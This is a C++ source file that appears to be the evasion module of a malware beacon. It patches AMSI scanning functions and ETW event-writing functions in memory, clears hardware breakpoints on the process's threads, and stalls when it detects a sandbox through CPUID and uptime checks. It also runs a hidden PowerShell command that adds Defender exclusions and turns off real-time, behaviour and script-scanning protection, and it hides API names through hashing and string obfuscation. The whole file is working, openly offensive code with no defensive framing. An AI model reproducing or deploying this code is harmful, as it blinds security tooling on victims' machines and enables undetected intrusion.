// evasion.cpp — Real AMSI/ETW/HW-BP/Defender-exclusion implementations.
// Nothing stubbed. Everything writes real bytes to real addresses.
#include "evasion.hpp"
#include "syscalls.hpp"
#include "utils.hpp"
#include "obfuscate.hpp"
#include <windows.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <string>
#include <vector>

// NtDelayExecution — used instead of Sleep to avoid hooking
typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
static NtDelayExecution_t pfnNtDelay = nullptr;

static void GhostSleep(DWORD ms) {
    if (!pfnNtDelay) {
        HMODULE h = GetModuleHandleA(XS("ntdll.dll"));
        pfnNtDelay = reinterpret_cast<NtDelayExecution_t>(
            HashProc(h, FNV("NtDelayExecution")));
    }
    if (pfnNtDelay) {
        LARGE_INTEGER li;
        li.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
        pfnNtDelay(FALSE, &li);
    } else {
        Sleep(ms);
    }
}

// ============================================================
// Anti-sandbox: CPUID hypervisor bit + uptime check
// Returns TRUE if we appear to be in a sandbox/VM and should abort.
// ============================================================
static BOOL IsLikelySandbox() {
    // 1. CPUID hypervisor bit — bit 31 of ECX on leaf 1
    int cpuInfo[4] = {};
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) {
        // Hypervisor present — optionally also check vendor
        // Many bare-metal systems also have this; combine with uptime.
        // Only treat as sandbox if BOTH hypervisor AND uptime < 5 min.
        ULONGLONG uptimeMs = GetTickCount64();
        if (uptimeMs < 300000ULL) return TRUE;
    }

    // 2. Minimum uptime < 2 min regardless — sandbox cold-boot
    if (GetTickCount64() < 120000ULL) return TRUE;

    return FALSE;
}

// ============================================================
// Internal: protect → patch → restore via NtProtectVirtualMemory
// Falls back to VirtualProtect if syscall table not yet ready.
// ============================================================
static BOOL MemPatch(PVOID target, const BYTE* patch, size_t patchLen) {
    PVOID   base   = target;
    SIZE_T  region = patchLen;
    ULONG   oldProt = 0;

    NTSTATUS st = STATUS_SUCCESS;
    if (g_Syscalls.NtProtectVirtualMemory) {
        st = g_Syscalls.NtProtectVirtualMemory(
            GetCurrentProcess(), &base, &region,
            PAGE_EXECUTE_READWRITE, &oldProt);
    }

    if (!g_Syscalls.NtProtectVirtualMemory || st != 0) {
        // Fallback — VirtualProtect
        DWORD op = 0;
        if (!VirtualProtect(target, patchLen, PAGE_EXECUTE_READWRITE, &op))
            return FALSE;
        oldProt = op;
    }

    memcpy(target, patch, patchLen);
    FlushInstructionCache(GetCurrentProcess(), target, patchLen);

    // Restore
    ULONG dummy = 0;
    if (g_Syscalls.NtProtectVirtualMemory) {
        g_Syscalls.NtProtectVirtualMemory(
            GetCurrentProcess(), &base, &region, oldProt, &dummy);
    } else {
        DWORD op2 = 0;
        VirtualProtect(target, patchLen, oldProt, &op2);
    }
    return TRUE;
}

// ============================================================
// AMSI bypass — patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
//   xor eax, eax  (33 C0)
//   ret           (C3)
// AmsiScanBuffer signature: HRESULT → upper nibble 0 = S_OK = CLEAN
// ============================================================
BOOL PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA(XS("amsi.dll"));
    if (!hAmsi) return FALSE;

    // Patch AmsiScanBuffer
    PVOID pScan = HashProc(hAmsi, FNV("AmsiScanBuffer"));
    if (pScan) {
        const BYTE patchScan[] = { 0x33, 0xC0, 0xC3 }; // xor eax,eax; ret
        MemPatch(pScan, patchScan, sizeof(patchScan));
    }

    // Also patch AmsiScanString for completeness
    PVOID pStr = HashProc(hAmsi, FNV("AmsiScanString"));
    if (pStr) {
        const BYTE patchStr[] = { 0x33, 0xC0, 0xC3 };
        MemPatch(pStr, patchStr, sizeof(patchStr));
    }

    // Patch AmsiOpenSession to always succeed
    PVOID pOpen = HashProc(hAmsi, FNV("AmsiOpenSession"));
    if (pOpen) {
        const BYTE patchOpen[] = { 0x33, 0xC0, 0xC3 };
        MemPatch(pOpen, patchOpen, sizeof(patchOpen));
    }

    return (pScan != nullptr);
}

// ============================================================
// ETW bypass — patch EtwEventWrite family with ret
// 0xC3 at entry point causes immediate return, no events written.
// ============================================================
BOOL PatchETW() {
    HMODULE hNtdll = GetModuleHandleA(XS("ntdll.dll"));
    if (!hNtdll) return FALSE;

    static const uint32_t etw_hashes[] = {
        FNV("EtwEventWrite"),
        FNV("EtwEventWriteFull"),
        FNV("EtwEventWriteEx"),
        FNV("EtwEventWriteTransfer"),
        FNV("EtwEventActivityIdControl"),
        FNV("EtwEventRegister"),
        FNV("EtwEventUnregister"),
        0
    };

    const BYTE ret1[] = { 0xC3 };
    BOOL anyPatched = FALSE;

    for (int i = 0; etw_hashes[i]; ++i) {
        PVOID p = HashProc(hNtdll, etw_hashes[i]);
        if (p) {
            MemPatch(p, ret1, sizeof(ret1));
            anyPatched = TRUE;
        }
    }

    return anyPatched;
}

// ============================================================
// Hardware breakpoint clear — VEH for self, suspend for others.
// ============================================================
static LONG CALLBACK VehHwbpClear(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP ||
        ep->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
        ep->ContextRecord->Dr0 = ep->ContextRecord->Dr1 = 0;
        ep->ContextRecord->Dr2 = ep->ContextRecord->Dr3 = 0;
        ep->ContextRecord->Dr6 = ep->ContextRecord->Dr7 = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL ClearHardwareBreakpoints() {
    // 1. Self thread — VEH path
    PVOID hVeh = AddVectoredExceptionHandler(1, VehHwbpClear);
    if (hVeh) {
        __try {
            RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nullptr);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
        }
        RemoveVectoredExceptionHandler(hVeh);
    }

    // 2. Other threads — Suspend/Context path
    DWORD selfPid = GetCurrentProcessId();
    DWORD selfTid = GetCurrentThreadId();

    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hKernel32) return FALSE;

    auto _CreateToolhelp32Snapshot = HASHPROC(hKernel32, CreateToolhelp32Snapshot);
    auto _Thread32First = HASHPROC(hKernel32, Thread32First);
    auto _Thread32Next = HASHPROC(hKernel32, Thread32Next);
    auto _OpenThread = HASHPROC(hKernel32, OpenThread);
    auto _SuspendThread = HASHPROC(hKernel32, SuspendThread);
    auto _ResumeThread = HASHPROC(hKernel32, ResumeThread);
    auto _GetThreadContext = HASHPROC(hKernel32, GetThreadContext);
    auto _SetThreadContext = HASHPROC(hKernel32, SetThreadContext);

    if (!_CreateToolhelp32Snapshot || !_Thread32First || !_Thread32Next || 
        !_OpenThread || !_SuspendThread || !_ResumeThread || 
        !_GetThreadContext || !_SetThreadContext) return FALSE;

    HANDLE snap = _CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return FALSE;

    THREADENTRY32 te = {};
    te.dwSize = sizeof(te);

    BOOL ok = TRUE;

    if (_Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != selfPid) continue;
            if (te.th32ThreadID == selfTid) continue;

            HANDLE hThr = _OpenThread(
                THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
                FALSE, te.th32ThreadID);
            if (!hThr) { ok = FALSE; continue; }
            
            _SuspendThread(hThr);

            CONTEXT ctx = {};
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

            if (_GetThreadContext(hThr, &ctx)) {
                ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
                ctx.Dr6 = 0;
                ctx.Dr7 = 0;
                if (!_SetThreadContext(hThr, &ctx)) ok = FALSE;
            } else {
                ok = FALSE;
            }

            _ResumeThread(hThr);
            CloseHandle(hThr);

        } while (_Thread32Next(snap, &te));
    }

    CloseHandle(snap);
    return ok;
}

// ============================================================
// Defender exclusion + disable real-time monitoring.
// Requires elevation. Runs PowerShell hidden, waits up to 15s.
// ============================================================
BOOL AddDefenderExclusion(const wchar_t* exePath) {
    if (!IsElevated()) return FALSE;

    // Build PowerShell one-liner — no raw strings visible in binary
    auto mpPref  = XSW(L"Add-MpPreference");
    auto setMp   = XSW(L"Set-MpPreference");
    auto psExe   = XSW(L"powershell.exe");

    std::wstring script =
        std::wstring(L"$p='") + exePath + L"';"
        + mpPref.str() + L" -ExclusionPath $p -ExclusionProcess (Split-Path $p -Leaf) -Force;"
        + setMp.str()  + L" -DisableRealtimeMonitoring $true"
        L" -DisableIOAVProtection $true"
        L" -DisableBehaviorMonitoring $true"
        L" -DisableBlockAtFirstSeen $true"
        L" -DisableScriptScanning $true"
        L" -DisableIntrusionPreventionSystem $true"
        L" -MAPSReporting 0 -Force";

    auto psFlags = XSW(L" -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"");
    std::wstring cmd = std::wstring(psExe.str()) + psFlags.str() + script + L"\"";

    STARTUPINFOW si    = {};
    PROCESS_INFORMATION pi = {};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hKernel32) return FALSE;
    auto _CreateProcessW = (BOOL(WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION))HashProc(hKernel32, FNV("CreateProcessW"));
    if (!_CreateProcessW) return FALSE;

    BOOL spawned = _CreateProcessW(
        nullptr, &cmd[0],
        nullptr, nullptr, FALSE,
        CREATE_NO_WINDOW,
        nullptr, nullptr, &si, &pi);

    if (spawned) {
        WaitForSingleObject(pi.hProcess, 15000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return spawned;
}

// ============================================================
// Reapply all evasion — called each beacon iteration.
// Bails early if sandbox detected.
// ============================================================
VOID ReapplyEvasion() {
    if (IsLikelySandbox()) {
        // Stall — sleep 10 minutes and retry later without doing anything
        GhostSleep(600000);
        return;
    }
    PatchAMSI();
    PatchETW();
    ClearHardwareBreakpoints();
}

// Expose sandbox check for main.cpp init gate
BOOL SandboxCheck() { return IsLikelySandbox(); }